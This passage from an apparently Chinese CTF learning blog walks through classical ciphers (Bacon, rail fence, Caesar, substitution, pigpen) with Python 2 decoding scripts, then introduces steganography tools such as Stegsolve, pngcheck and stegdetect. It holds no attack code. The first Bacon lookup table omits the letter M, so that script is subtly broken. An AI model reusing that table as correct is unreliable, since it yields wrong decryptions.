然后每五个对应一个字母的脚本  我还没写大小写转化脚本 这里只有 五个字母对应一个字母脚本<br>（1）<a href="http://rumkin.com/tools/cipher/baconian.php">在线加解密</a><br>（2）<code>Python脚本</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/Bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#__author__ = &#x27;tyomcat&#x27;</span></span><br><span class="line"><span class="comment"># 培根解密代码</span></span><br><span class="line"><span class="comment"># 两种加密方式</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">peig1</span>(<span class="params">m</span>):</span></span><br><span class="line">    basic1 = &#123;</span><br><span class="line">    <span class="string">&#x27;AAAAA&#x27;</span> : <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AAAAB&#x27;</span> : <span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AAABA&#x27;</span> : <span class="string">&#x27;C&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AAABB&#x27;</span> : <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABAA&#x27;</span> : <span class="string">&#x27;E&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABAB&#x27;</span> : <span class="string">&#x27;F&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABBA&#x27;</span> : <span class="string">&#x27;G&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABBB&#x27;</span> : <span class="string">&#x27;H&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABAAA&#x27;</span> : <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABAAB&#x27;</span> : <span class="string">&#x27;J&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABABA&#x27;</span> : <span class="string">&#x27;K&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABABB&#x27;</span> : <span class="string">&#x27;L&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBAB&#x27;</span> : <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBBA&#x27;</span> : <span class="string">&#x27;O&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBBB&#x27;</span> : <span class="string">&#x27;P&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAAAA&#x27;</span> : <span class="string">&#x27;Q&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAAAB&#x27;</span> : <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAABA&#x27;</span> : <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAABB&#x27;</span> : <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABAA&#x27;</span> : <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABAB&#x27;</span> : <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABBA&#x27;</span> : <span class="string">&#x27;W&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABBB&#x27;</span> : <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BBAAA&#x27;</span> : <span class="string">&#x27;Y&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BBAAB&#x27;</span> : <span class="string">&#x27;Z&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    output = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(m) - <span class="number">4</span>, <span class="number">5</span>):</span><br><span class="line">        temp = m[i: i + <span class="number">5</span>]</span><br><span class="line">        output += basic1[temp]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">peig2</span>(<span class="params">m</span>):</span></span><br><span class="line"></span><br><span class="line">    basic2 = &#123;</span><br><span class="line">    <span class="string">&#x27;AAAAA&#x27;</span> : <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AAAAB&#x27;</span> : <span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AAABA&#x27;</span> : <span class="string">&#x27;C&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AAABB&#x27;</span> : <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABAA&#x27;</span> : <span class="string">&#x27;E&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABAB&#x27;</span> : <span class="string">&#x27;F&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABBA&#x27;</span> : <span class="string">&#x27;G&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABBB&#x27;</span> : <span class="string">&#x27;H&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABAAA&#x27;</span> : <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABAAA&#x27;</span> : <span class="string">&#x27;J&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABAAB&#x27;</span> : <span class="string">&#x27;K&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABABA&#x27;</span> : <span class="string">&#x27;L&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABABB&#x27;</span> : <span class="string">&#x27;M&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBAA&#x27;</span> : <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBAB&#x27;</span> : <span class="string">&#x27;O&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBBA&#x27;</span> : <span class="string">&#x27;P&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBBB&#x27;</span> : <span class="string">&#x27;Q&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAAAA&#x27;</span> : <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAAAB&#x27;</span> : <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAABA&#x27;</span> : <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAABB&#x27;</span> : <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAABB&#x27;</span> : <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABAA&#x27;</span> : <span class="string">&#x27;W&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABAB&#x27;</span> : <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABBA&#x27;</span> : <span class="string">&#x27;Y&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABBB&#x27;</span> : <span class="string">&#x27;Z&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    output = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(m) - <span class="number">4</span>, <span class="number">5</span>):</span><br><span class="line">        temp = m[i: i + <span class="number">5</span>]</span><br><span class="line">        output += basic2[temp]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    </span><br><span class="line">    m = raw_input(<span class="string">&quot;请输入密文:&quot;</span>)</span><br><span class="line">    mode = input(<span class="string">&quot;选择密文对应的方式 1 or 2：&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> len(m)%<span class="number">5</span> == <span class="number">0</span>:</span><br><span class="line">        l = []</span><br><span class="line">        k = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(m)/<span class="number">5</span>):</span><br><span class="line">            l.append(m[:<span class="number">5</span>])</span><br><span class="line">            m = m[<span class="number">5</span>:]</span><br><span class="line">        <span class="keyword">if</span> mode == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">                <span class="keyword">if</span> i.isupper():</span><br><span class="line">                    k.append(peig1(i))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    i = i.upper()</span><br><span class="line">                    k.append(peig1(i))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> mode == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">                <span class="keyword">if</span> i.isupper():</span><br><span class="line">                    k.append(peig2(i))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    i = i.upper()</span><br><span class="line">                    k.append(peig2(i))</span><br><span class="line">        flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> k:</span><br><span class="line">            flag+=i[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">print</span> flag</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h2><p>(1) 一个win平台下的</p><p><a href="http://oayoilchh.bkt.clouddn.com/%E6%A0%85%E6%A0%8F%E5%AF%86%E7%A0%81%E5%8A%A0%E8%A7%A3%E5%AF%861.10.exe">软件</a><br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zhalan.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zhalan.jpg"></a></p><p>（2）<code>python脚本</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author:Swing</span></span><br><span class="line"><span class="comment">#通用脚本</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf_8 -*-</span></span><br><span class="line">e = raw_input(<span class="string">&#x27;请输入要解密的字符串\n&#x27;</span>)</span><br><span class="line">elen = len(e)</span><br><span class="line">field=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,elen):</span><br><span class="line"><span class="keyword">if</span>(elen%i==<span class="number">0</span>):</span><br><span class="line">field.append(i)</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> field:</span><br><span class="line">    b = elen / f</span><br><span class="line">    result = &#123;x:<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(b)&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(elen):</span><br><span class="line">        a = i % b;</span><br><span class="line">        result.update(&#123;a:result[a] + e[i]&#125;)</span><br><span class="line">    d = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(b):</span><br><span class="line">        d = d + result[i]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;分为\t&#x27;</span>+str(f)+<span class="string">&#x27;\t&#x27;</span>+<span class="string">&#x27;栏时，解密结果为：  &#x27;</span>+d</span><br></pre></td></tr></table></figure><h2 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h2><p>凯撒密码(Caesar Cipher或称恺撒加密、恺撒变换、变换加密、位移加密)是一种替换加密，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推，更多<a href="https://en.wikipedia.org/wiki/Caesar_cipher">参考</a><br>位移参考</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/caesar-cipher" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/caesar-cipher"></a></p><p>(1)<a href="http://planetcalc.com/1434/">网站链接</a> 这个网站可以列出1-26的可能性<br>(1)还有一种方法就是利用<a href="http://">JPK</a>这个工具</p><p>使用方法看图就够了吧</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/jpk-tool.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/jpk-tool.jpg"></a></p><p>(3)<code>Python实现</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__ = &#x27;tyomcat&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span>(<span class="params">c, key, start = <span class="string">&#x27;a&#x27;</span>, n = <span class="number">26</span></span>):</span></span><br><span class="line">    a = ord(start)</span><br><span class="line">    offset = ((ord(c) - a + key)%n)</span><br><span class="line">    <span class="keyword">return</span> chr(a + offset)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">caesarEncode</span>(<span class="params">s, key</span>):</span></span><br><span class="line">    o = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> c.islower():</span><br><span class="line">            o+= convert(c, key, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> c.isupper():</span><br><span class="line">            o+= convert(c, key, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            o+= c</span><br><span class="line">    <span class="keyword">return</span> o</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">caesarDecode</span>(<span class="params">s, key</span>):</span></span><br><span class="line">    <span class="keyword">return</span> caesarEncode(s, -key)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> range(<span class="number">27</span>):</span><br><span class="line">       e=<span class="string">&#x27;Jr1p0zr2VfPp&#x27;</span>     <span class="comment">#写这里</span></span><br><span class="line">       d = caesarDecode(e, key)</span><br><span class="line"></span><br><span class="line">       <span class="keyword">print</span> d</span><br><span class="line">       <span class="keyword">print</span> <span class="string">&#x27;\n&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="凯撒变种-Ascii码"><a href="#凯撒变种-Ascii码" class="headerlink" title="凯撒变种 -Ascii码"></a>凯撒变种 -Ascii码</h3><p>2017年3月30日 今天有人在HCTF群里问一个密码学题 就是凯撒的变种  在Ascii码中的变换，我的好基友 一帆同学，已经说了怎么做 ..还在让别人帮他做。让我想起来 HCTF 官方Wp上的一句话 究竟是在玩CTF 还是在被CTF玩？</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key = <span class="string">&quot;D5Y8h5H|]mP3PGD|RGokPmTqPZYK]JQoPmH|Q&#125;IpPGEpQZH6iT@@&quot;</span><span class="comment">#raw_input(&#x27;put flag:&#x27;)</span></span><br><span class="line">new_str = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    i = ord(i)<span class="number">-3</span></span><br><span class="line">    i = chr(i)</span><br><span class="line">    new_str = new_str +i</span><br><span class="line"><span class="keyword">print</span> new_str</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[*] flag:&quot;</span>+ base64.b64decode(new_str)</span><br></pre></td></tr></table></figure><h2 id="简单替换密码"><a href="#简单替换密码" class="headerlink" title="简单替换密码"></a>简单替换密码</h2><p>简单换位密码(Simple Substitution Cipher)加密方式是以每个明文字母被与之唯一对应且不同的字母替换的方式实现的，它不同于恺撒密码，因为密码字母表的字母不是简单的移位，而是完全是混乱的 例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">明文字母 : abcdefghijklmnopqrstuvwxyz</span><br><span class="line">明文字母 : phqgiumeaylnofdxjkrcvstzwb</span><br></pre></td></tr></table></figure><p>其实我感觉有点像是词频攻击就可以解决所以我（麦香师傅告诉我才知道的）推荐一个词频攻击的网站<code>要有梯子</code><a href="http://quipqiup.com/index.php">http://quipqiup.com/index.php</a></p><h2 id="猪圈密码"><a href="#猪圈密码" class="headerlink" title="猪圈密码"></a>猪圈密码</h2><p>猪圈密码(Pigpen Cipher或称九宫格密码、朱高密码、共济会密码或共济会员密码)，是一种以格子为基础的简单替代式密码<br>明文和密文对应：</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/pigpen-cipher.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/pigpen-cipher.jpg"></a></p><p>在线解密<a href="http://www.simonsingh.net/The_Black_Chamber/pigpen.html">飞机票</a><br>上面是正常的对应 我见过一种变形的 与其说是猪圈不如说是替换<br>替换规则是 左右字母替换</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/pigpen-cipher-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/pigpen-cipher-02.jpg"></a></p><p>右边的跟左边的一一对应，在左边的换成右边<br><code>2015年广东强网杯 小心猪圈</code>的题目就是这样的<br>附上我的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line">s=raw_input()</span><br><span class="line">Key = &#123;</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;j&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>:<span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>:<span class="string">&#x27;l&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>:<span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;e&#x27;</span>:<span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;g&#x27;</span>:<span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span>:<span class="string">&#x27;q&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;i&#x27;</span>:<span class="string">&#x27;r&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>:<span class="string">&#x27;w&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;t&#x27;</span>:<span class="string">&#x27;x&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;u&#x27;</span>:<span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;v&#x27;</span>:<span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;-&#x27;</span>:<span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&#123;&#x27;</span>:<span class="string">&#x27;&#123;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&#125;&#x27;</span>:<span class="string">&#x27;&#125;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;j&#x27;</span>:<span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;k&#x27;</span>:<span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;l&#x27;</span>:<span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;m&#x27;</span>:<span class="string">&#x27;d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span>:<span class="string">&#x27;e&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>:<span class="string">&#x27;f&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span>:<span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>:<span class="string">&#x27;h&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;r&#x27;</span>:<span class="string">&#x27;i&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;w&#x27;</span>:<span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;y&#x27;</span>:<span class="string">&#x27;u&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>:<span class="string">&#x27;v&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">output1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i  <span class="keyword">in</span> range(<span class="number">0</span>,len(s)):</span><br><span class="line">     temp=s[i]</span><br><span class="line">     output1+=Key[temp]</span><br><span class="line"><span class="keyword">print</span> output1</span><br></pre></td></tr></table></figure><p>更多关于密码学和编码的问题可以参考<a href="https://www.hackfun.org/CTF/coding-and-encryption-of-those-brain-holes-in-CTF.html">4ido10n表哥的博文</a></p><h1 id="隐写工具"><a href="#隐写工具" class="headerlink" title="隐写工具"></a>隐写工具</h1><h2 id="Stegsolve"><a href="#Stegsolve" class="headerlink" title="Stegsolve"></a>Stegsolve</h2><p>图片隐写的神器 <a href="https://yunpan.cn/c6jV9E9ZevwdF">下载的传送门</a>（提取码：c146）</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/stegosolve-01" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/stegosolve-01"></a></p><p>具体可以自己尝试 简单介绍几下两个功能</p><ol><li>Stereogram Solver<br>这个功能可以从不同通道去分析图片</li><li>Frame Browser<br> 这个功能是如果这张图片里面还藏这另外一张图片的话 他可以分离出来</li><li>Image Combiner<br>这个功能可以对比两张图片 最终Sub出不一样的地方<h2 id="pngcheck"><a href="#pngcheck" class="headerlink" title="pngcheck"></a>pngcheck</h2><code>pngcheck.exe -v sctf.png</code><br><code>这个是Dos下的工具 win32平台的</code><br><a href="https://yunpan.cn/c6jjU9MsIWkWv">下载传送门</a> （提取码：f47b）<br>他的功能是检测png格式图片的损坏位置 一般用来对PNG隐写进行修复会用到<h2 id="stegdetect"><a href="#stegdetect" class="headerlink" title="stegdetect"></a>stegdetect</h2>这个东西是用来检测图片的隐写方式的 它可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息<br><a href="https://yunpan.cn/c6jwUT7EA9ywW">下载传送门</a> （提取码：4c2e）</li></ol><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/pngcheck-01" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/pngcheck-01"></a></p><p>比如图中就可以看出他是<code>Jphide</code>隐写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">使用规则:</span><br><span class="line">    q 仅显示可能包含隐藏内容的图像。</span><br><span class="line">-n 启用检查JPEG文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。如果JPEG文件的JFIF标识符中的版本号不是1.1，则禁用OutGuess检测。</span><br><span class="line">-s 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</span><br><span class="line">-d 打印带行号的调试信息。</span><br><span class="line">-t 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：</span><br><span class="line">j 检测图像中的信息是否是用jsteg嵌入的。</span><br><span class="line">o 检测图像中的信息是否是用outguess嵌入的。</span><br><span class="line">p 检测图像中的信息是否是用jphide嵌入的。</span><br><span class="line">i 检测图像中的信息是否是用invisible secrets嵌入的。</span><br><span class="line">-V 显示软件版本号。</span><br><span class="line">如果检测结果显示该文件可能包含隐藏信息，那么Stegdetect会在检测结果后面使用1～3颗星来标识</span><br><span class="line">隐藏信息存在的可能性大小，3颗星表示隐藏信息存在的可能性最大。</span><br></pre></td></tr></table></figure><h2 id="Jphide"><a href="#Jphide" class="headerlink" title="Jphide"></a>Jphide</h2><p>先推荐表哥的博文 他写得好详细<a href="https://www.hackfun.org/CTF/jphide-steganography.html">传送门</a><br><a href="http://linux01.gwdg.de/~alatham/stego.html">下载传送门</a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/jphide-01" 